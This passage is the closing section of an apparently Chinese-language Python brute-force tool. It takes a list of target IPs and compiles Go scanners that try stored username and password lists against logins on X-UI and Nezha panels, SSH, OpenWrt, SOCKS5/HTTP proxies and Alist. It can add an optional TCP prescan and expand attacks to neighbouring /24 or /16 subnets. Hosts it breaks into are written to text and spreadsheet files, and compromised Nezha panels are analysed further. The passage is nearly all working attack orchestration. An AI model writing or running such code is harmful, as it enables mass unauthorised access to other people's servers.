        ips_to_analyze = newly_verified_this_round

    with open(result_file, 'r', encoding='utf-8') as f: initial_set = {line.strip() for line in f}
    return master_results - initial_set

def run_go_tcp_prescan(source_lines, python_concurrency, go_concurrency, timeout, chunk_size):
    print("\n--- 正在执行 Go TCP 预扫描以筛选活性IP... ---")
    generate_go_code("tcp_prescan.go", TCP_PRESCAN_GO_TEMPLATE_LINES, semaphore_size=go_concurrency, timeout=timeout)
    executable = compile_go_program("tcp_prescan.go", "tcp_prescan_executable")
    if not executable: return source_lines
    os.makedirs(TEMP_PRESCAN_DIR, exist_ok=True)
    global TEMP_XUI_DIR
    original_xui_dir, TEMP_XUI_DIR = TEMP_XUI_DIR, TEMP_PRESCAN_DIR
    run_scan_in_parallel(source_lines, executable, python_concurrency, chunk_size, desc="[⚡] TCP活性检测")
    TEMP_XUI_DIR = original_xui_dir
    prescan_results_file = "prescan_merged.tmp"
    merge_result_files("output_", prescan_results_file, TEMP_PRESCAN_DIR)
    live_targets = []
    if os.path.exists(prescan_results_file):
        with open(prescan_results_file, 'r', encoding='utf-8') as f:
            live_targets = [line.strip() for line in f if line.strip()]
        os.remove(prescan_results_file)
    shutil.rmtree(TEMP_PRESCAN_DIR, ignore_errors=True)
    print(f"--- ✅ Go TCP 预扫描完成。筛选出 {len(live_targets)} / {len(source_lines)} 个活性目标。---")
    return live_targets

if __name__ == "__main__":
    start_time = time.time()
    
    TEMP_PART_DIR, TEMP_XUI_DIR, TEMP_EXPAND_DIR, TEMP_PRESCAN_DIR = "temp_parts", "xui_outputs", "temp_expand", "temp_prescan"
    master_results, master_results_lock = set(), Lock()
    
    from datetime import datetime, timedelta, timezone
    time_str = (datetime.now(timezone.utc) + timedelta(hours=8)).strftime("%Y%m%d-%H%M")
    
    TEMPLATE_MODE = choose_template_mode()
    prefix = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 9: "SOCKS5", 10: "HTTP", 11: "HTTPS", 12: "Alist", 13: "TCP-Active"}.get(TEMPLATE_MODE, "result")

    try:
        print("\n🚀 === 爆破一键启动 - 参数配置 === 🚀")
        
        is_china_env = is_in_china()
        check_environment(TEMPLATE_MODE, is_china_env)
        
        adjust_oom_score()
        check_and_manage_swap()
        
        use_go_prescan = input("是否启用 Go TCP 预扫描？(y/N): ").strip().lower() == 'y' if TEMPLATE_MODE != 13 else False
        input_file = input("📝 请输入源文件名 (默认: 1.txt)：").strip() or "1.txt"
        if not os.path.exists(input_file): print(f"❌ 错误: 文件 '{input_file}' 不存在。"); sys.exit(1)
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f: all_lines = [line.strip() for line in f if line.strip()]
        total_ips = len(all_lines)
        print(f"--- 📝 总计 {total_ips} 个目标 ---")
        
        cpu_cores = os.cpu_count() or 2
        python_concurrency = input_with_default("请输入Python并发任务数", cpu_cores * 2)
        go_internal_concurrency = input_with_default("请输入每个任务内部的Go并发数", 100)
        chunk_size = input_with_default("请输入每个小任务处理的IP数量", 500)

        if use_go_prescan:
            all_lines = run_go_tcp_prescan(all_lines, python_concurrency, go_internal_concurrency, 3, chunk_size)
            if not all_lines: print("预扫描后没有发现活性目标，脚本结束。"); sys.exit(0)
        
        use_expand_scan = input("是否在扫描结束后启用子网扩展扫描? (y/N): ").strip().lower() == 'y'
        subnet_expansion_size = 16 if use_expand_scan and input("请选择子网扩展范围 (1: /24, 2: /16, 默认 1): ").strip() == '2' else 24

        params = {'semaphore_size': go_internal_concurrency, 'timeout': input_with_default("超时时间(秒)", 3)}
        params['usernames'], params['passwords'], _ = load_credentials(TEMPLATE_MODE)
        
        os.makedirs(TEMP_PART_DIR, exist_ok=True); os.makedirs(TEMP_XUI_DIR, exist_ok=True); os.makedirs(TEMP_EXPAND_DIR, exist_ok=True)
        
        template_map = {
            1: XUI_GO_TEMPLATE_1_LINES, 2: XUI_GO_TEMPLATE_2_LINES, 6: XUI_GO_TEMPLATE_6_LINES, 7: XUI_GO_TEMPLATE_7_LINES,
            8: XUI_GO_TEMPLATE_8_LINES, 9: PROXY_GO_TEMPLATE_LINES, 10: PROXY_GO_TEMPLATE_LINES, 11: PROXY_GO_TEMPLATE_LINES,
            12: ALIST_GO_TEMPLATE_LINES, 13: TCP_ACTIVE_GO_TEMPLATE_LINES,
        }
        generate_go_code("xui.go", template_map[TEMPLATE_MODE], **params)
        executable = compile_go_program("xui.go", "xui_executable")
        
        generate_ipcx_py()
        run_scan_in_parallel(all_lines, executable, python_concurrency, chunk_size)
        
        initial_results_file = "xui_merged.tmp"
        merge_result_files("output_", initial_results_file, TEMP_XUI_DIR)

        if use_expand_scan and os.path.exists(initial_results_file) and os.path.getsize(initial_results_file) > 0:
            generate_go_code("subnet_scanner.go", SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES)
            subnet_scanner_exec = compile_go_program("subnet_scanner.go", "subnet_scanner_executable")
            if subnet_scanner_exec:
                newly_found = expand_scan_with_go(initial_results_file, executable, subnet_scanner_exec, subnet_expansion_size, python_concurrency)
                if newly_found:
                    print(f"--- [扩展] 扫描完成，新增 {len(newly_found)} 个结果。正在合并... ---")
                    with open(initial_results_file, 'a', encoding='utf-8') as f:
                        f.writelines(f"{result}\n" for result in sorted(list(newly_found)))
                    with open(initial_results_file, 'r', encoding='utf-8') as f: unique_lines = sorted(list(set(f.readlines())))
                    with open(initial_results_file, 'w', encoding='utf-8') as f: f.writelines(unique_lines)

        final_txt_file = f"{prefix}-{time_str}.txt"
        final_xlsx_file = f"{prefix}-{time_str}.xlsx"
        if os.path.exists(initial_results_file):
            shutil.move(initial_results_file, final_txt_file)
            run_ipcx(final_txt_file, final_xlsx_file)

        if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
            analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50)
            print(f"\n--- 🔍 [分析] 开始对成功的哪吒面板进行深度分析 (使用 {analysis_threads} 线程)... ---")
            with open(final_txt_file, 'r', encoding='utf-8') as f: results = [line.strip() for line in f if line.strip()]
            nezha_analysis_data = {}
            with ThreadPoolExecutor(max_workers=analysis_threads) as executor:
                future_to_result = {executor.submit(analyze_panel, res): res for res in results}
                for future in tqdm(as_completed(future_to_result), total=len(results), desc="[🔍] 分析哪吒面板"):
                    result_line = future_to_result[future]
                    try: nezha_analysis_data[result_line] = future.result()[1]
                    except Exception as exc: nezha_analysis_data[result_line] = ("分析异常", 0, "N/A")
            if nezha_analysis_data:
                update_excel_with_nezha_analysis(final_xlsx_file, nezha_analysis_data)
        
    except (KeyboardInterrupt, SystemExit, EOFError) as e:
        print("\n>>> 🛑 操作被中断... ")
    finally:
        clean_temp_files()
        cost = int(time.time() - start_time)
        print(f"\n=== 🎉 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")
